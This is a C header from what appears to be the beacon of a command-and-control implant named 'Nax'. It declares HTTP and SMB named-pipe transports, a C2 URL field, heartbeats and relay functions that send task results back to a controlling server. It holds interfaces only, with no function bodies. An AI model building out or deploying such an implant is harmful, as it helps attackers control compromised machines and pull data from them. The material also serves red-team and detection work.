/* beacon/include/Transport.h
 * Common transport interface.  Http.c and Smb.c both implement NAX_TRANSPORT_FN.
 * NaxSend is a compile-time alias - no runtime dispatch overhead.
 *
 * To add a new transport:
 *   1. Implement NAX_TRANSPORT_FN in src/Transport/YourTransport.c
 *   2. Add a NAX_TRANSPORT_* constant and case in the #if chain below
 *   3. Build with -DNAX_TRANSPORT_PROFILE=NAX_TRANSPORT_YOUR             */

#pragma once
#include "Instance.h"

/* ========= [ transport function type ] ========= */

/* All transports share this signature.
 * url_w  : null-terminated wide URL (HTTP) or pipe path (SMB)
 * sid    : 16-char hex session ID (used as HTTP header or pipe auth)
 * Returns NAX_OK on success, NAX_ERR_NET on any failure.                */
typedef INT (*NAX_TRANSPORT_FN)(
    PNAX_INSTANCE  Nax,
    const PWCHAR   url_w,
    const PCHAR    sid,
    const PBYTE    body,     UINT32  body_len,
    PBYTE          resp_buf, UINT32* resp_len
);

/* ========= [ compile-time profile selection ] ========= */

#define NAX_TRANSPORT_HTTP  0
#define NAX_TRANSPORT_SMB   1   /* Phase 7 */

#ifndef NAX_TRANSPORT_PROFILE
#  define NAX_TRANSPORT_PROFILE NAX_TRANSPORT_HTTP
#endif

/* ========= [ protocol declarations ] ========= */

FUNC INT NaxHttpPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid,
                      const PBYTE body, UINT32 body_len,
                      PBYTE resp_buf, UINT32* resp_len );

FUNC INT NaxSmbPost( PNAX_INSTANCE Nax, const PWCHAR pipe_path, const PCHAR sid,
                     const PBYTE body, UINT32 body_len,
                     PBYTE resp_buf, UINT32* resp_len );

FUNC INT NaxHttpGet( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid,
                     const PBYTE body, UINT32 body_len,
                     PBYTE resp_buf, UINT32* resp_len );

FUNC INT NaxHttpGetOrPost( PNAX_INSTANCE Nax, const PWCHAR url_w, const PCHAR sid,
                           const PBYTE body, UINT32 body_len,
                           PBYTE resp_buf, UINT32* resp_len );

/* ========= [ HTTP transaction types (codec dispatch) ] ========= */

#define NAX_TXN_GET       0
#define NAX_TXN_POST      1
#define NAX_TXN_REGISTER  2

/* ========= [ HTTP high-level codec (Transport/HttpCodec.c) ] ========= */

FUNC UINT32 NaxHttpEncodeBody( PNAX_INSTANCE Nax, const PBYTE body, UINT32 body_len, PBYTE enc_buf, UINT32 enc_cap );
FUNC VOID   NaxHttpDecodeResponse( PNAX_INSTANCE Nax, BYTE txn_type, PBYTE read_buf, UINT32 read_len, PBYTE resp_buf, UINT32* resp_len );

/* ========= [ relay context (compile-time gated) ] ========= */

typedef struct _NAX_RELAY_CTX {
#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
    PWCHAR C2Url;
    PBYTE  Resp;
    UINT32 RespCap;
#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
    HANDLE hPipe;
    HANDLE hWriteEvent;
    BOOL   DataRelayed;
    BOOL   TunnelRelayed;
#endif
} NAX_RELAY_CTX;

/* ========= [ relay engine (Transport/Relay.c) ] ========= */

#if NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
FUNC BOOL NaxSendResult( PNAX_INSTANCE Nax, UINT32 tid, BYTE status, const PBYTE data, UINT32 data_len, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, PWCHAR c2_url, PBYTE resp, UINT32 resp_cap );
#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
FUNC BOOL NaxSendResult( PNAX_INSTANCE Nax, UINT32 tid, BYTE status, const PBYTE data, UINT32 data_len, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, HANDLE hPipe, HANDLE hWriteEvent );
#endif

FUNC BOOL NaxRelayAll( PNAX_INSTANCE Nax, PBYTE result, UINT32 result_cap, PBYTE frame, UINT32 frame_cap, PBYTE env, UINT32 env_cap, NAX_RELAY_CTX* ctx );

/* ========= [ transport main loops ] ========= */

FUNC VOID NaxHttpMain( PNAX_INSTANCE Nax );
FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax );

/* ========= [ NaxSend alias ] ========= */

#if   NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_HTTP
#  define NaxSend           NaxHttpPost
#  define NaxSendHeartbeat  NaxHttpGetOrPost
#elif NAX_TRANSPORT_PROFILE == NAX_TRANSPORT_SMB
#  define NaxSend           NaxSmbPost
#  define NaxSendHeartbeat  NaxSmbPost
#else
#  error "Unknown NAX_TRANSPORT_PROFILE"
#endif
